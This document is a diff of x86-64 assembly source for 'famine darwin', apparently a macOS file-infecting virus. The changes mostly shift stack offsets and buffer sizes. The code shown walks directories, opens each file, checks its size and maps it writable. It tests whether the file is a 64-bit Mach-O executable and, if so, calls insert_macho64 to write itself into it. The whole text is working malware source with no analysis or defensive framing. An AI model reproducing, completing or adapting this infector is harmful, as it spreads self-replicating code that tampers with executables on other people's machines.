@@ -1,4 +1,4 @@
-; famine darwin - size 675 bytes
+; famine darwin - size 706 bytes
 
 %include "famine.inc"
 
@@ -41,12 +41,12 @@ _start:
                 syscall
                 jc          .nextdir                            ;XXX expecting carry flag if syscall fails
 
-                mov         [rsp-0x30], rax                     ;rsp-0x30 = directory_fd
+                mov         [rsp-0x100], rax                    ;rsp-0x30 = directory_fd
 
-.readdir:       lea         r10, [rsp-0x28]                     ;long *basep for macos
-                mov         rdx, BUF_SIZE
-                lea         rsi, [rsp - (BUF_SIZE + LOCAL_VARS)]
-                mov         rdi, [rsp-0x30]                     ;directory fd
+.readdir:       lea         r10, [rsp-0x108]                    ;long *basep for macos
+                mov         rdx, 0x400
+                lea         rsi, [rsp-0x800]
+                mov         rdi, [rsp-0x100]                    ;directory fd
                 mov         rax, Darwin__NR_getdents
                 syscall
                 test        rax, rax
@@ -55,7 +55,7 @@ _start:
                 xor         r13, r13
                 mov         r12, rax
 .file:
-                lea         rdi, [rsp - (BUF_SIZE + LOCAL_VARS)]
+                lea         rdi, [rsp-0x800]
                 add         rdi, r13
 
                 xor         edx, edx
@@ -74,7 +74,7 @@ _start:
                 jl          .file
                 jmp         .readdir
 
-.closedir:      mov         rdi, [rsp-0x30]
+.closedir:      mov         rdi, [rsp-0x100]
                 mov         rax, Darwin__NR_close
                 syscall
 .nextdir:
@@ -98,7 +98,7 @@ process:                                                        ; expecting file
                                                                 ; directory in r14
                 mov         rsi, r14
                 mov         rax, rdi
-                lea         rdi, [rsp - ((BUF_SIZE * 2) + LOCAL_VARS)]
+                lea         rdi, [rsp - 0xc00]
                 mov         rdx, rdi                            ; concat directory and filename
 
 .dirname:       movsb
@@ -121,22 +121,22 @@ process:                                                        ; expecting file
                 syscall
                 jc          .return                             ; XXX expecting carry flag if open() fails
 
-                mov         [rsp-0x48], rax                     ; rsp-0x48 = infect_fd
+                mov         [rsp-0x118], rax                    ; rsp-0x118 = infect_fd
 
-                lea         rsi, [rsp - 0x148]                  ; rsp-0x148 = fstat buf
-                mov         rdi, [rsp-0x48]
+                lea         rsi, [rsp - 0x300]                  ; rsp-0x300 = fstat buf
+                mov         rdi, rax
                 mov         rax, Darwin__NR_fstat
                 syscall
                 cmp         rax, 0
                 jnz         .close
 
-                mov         rsi, qword [rsp - (0x148-0x48)]     ; macos st_size
-                mov         [rsp-0x50], rsi                     ; rsp-0x50 = infect_fsize
+                mov         rsi, qword [rsp - (0x300-0x48)]     ; macos st_size
+                mov         [rsp-0x120], rsi                    ; rsp-0x120 = infect_fsize
                 cmp         rsi, 0x1000                         ; file too small
                 jl          .close
 
                 xor         r9, r9
-                mov         r8, [rsp-0x48]
+                mov         r8, [rsp-0x118]
                 mov         r10, MAP_SHARED
                 mov         rdx, PROT_READ | PROT_WRITE
                                                                 ; rsi has file size already
@@ -146,7 +146,7 @@ process:                                                        ; expecting file
                 cmp         rax, -4095
                 jae         .close
 
-                mov         [rsp-0x58], rax                     ;rsp-0x58 = infect_mem
+                mov         [rsp-0x128], rax                    ;rsp-0x128 = infect_mem
                 mov         rdi, rax
 
                 call        is_valid_macho64
@@ -155,12 +155,12 @@ process:                                                        ; expecting file
 
                 call        insert_macho64
 
-.unmap:         mov         rsi, [rsp-0x50]                     ; infect_fsize
-                mov         rdi, [rsp-0x58]                     ; infect_mem
+.unmap:         mov         rsi, [rsp-0x120]                    ; infect_fsize
+                mov         rdi, [rsp-0x128]                    ; infect_mem
                 mov         rax, Darwin__NR_munmap
                 syscall
 
-.close:         mov         rdi, [rsp-0x48]
+.close:         mov         rdi, [rsp-0x118]
                 mov         rax, Darwin__NR_close
                 syscall
 .return:        ret
